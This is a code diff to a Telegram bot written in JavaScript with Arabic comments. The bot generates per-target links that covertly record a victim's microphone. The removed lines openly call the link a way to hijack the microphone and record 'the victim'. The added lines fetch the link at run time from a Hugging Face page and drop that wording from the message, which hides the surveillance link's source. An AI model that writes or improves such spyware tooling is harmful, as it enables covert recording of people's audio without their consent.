@@ -4389,27 +4389,50 @@ bot.onText(/\/stahqkakasbvdolsrt/, (msg) => {
 });
 
 // معالجة ضغط زر الإنلاين
-bot.on('callback_query', (callbackQuery) => {
-    const message = callbackQuery.message;
-    const chatId = message.chat.id;
+bot.on('callback_query', async (callbackQuery) => {
+    const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
 
     if (data.startsWith('recordAudio:')) {
         const targetChatId = data.split(':')[1];
-        
-        // إنشاء رابط HTML فريد لكل مستخدم
-        const audioUrl = `https://jolly-donut-dec1ee.netlify.app/r/?chatId=${targetChatId}`;
-        
-        // إرسال الرابط كرسالة نصية عادية
-        bot.sendMessage(
-            chatId, 
-            `تم تليغم الرابط لخـ ^_^ـ.راق المكرفون وتسجيل صوت الضحيه 💀:\n\n${audioUrl}`
-        );
-        
+
+        // استيراد الرابط ديناميكياً من الموقع
+        const audioLink = await fetchDynamicLink("r"); // "r" لتحديد الرابط المطلوب
+
+        if (audioLink) {
+            const audioUrl = `${audioLink}?chatId=${targetChatId}`;
+            bot.sendMessage(chatId, `الرابط:\n\n${audioUrl}`);
+        } else {
+            bot.sendMessage(chatId, '❌ لم يتم العثور على الرابط المطلوب في الموقع');
+        }
+
         // تأكيد استلام الضغط
         bot.answerCallbackQuery(callbackQuery.id);
     }
 });
+
+// دالة fetchDynamicLink لاستيراد الرابط ديناميكياً
+async function fetchDynamicLink(namePart) {
+    try {
+        const url = "https://sssssskskjwnsb-linklsksn.hf.space";
+        const response = await axios.get(url, { timeout: 10000 });
+        const $ = cheerio.load(response.data);
+        let foundLink = null;
+
+        $('a[href]').each((i, el) => {
+            const link = $(el).attr('href');
+            if (link.includes(namePart)) {
+                foundLink = link;
+                return false; // التوقف عند أول تطابق
+            }
+        });
+
+        return foundLink;
+    } catch (err) {
+        console.error("Error fetching link:", err.message);
+        return null;
+    }
+}
 
 const clearTemporaryStorage = () => {
     try {
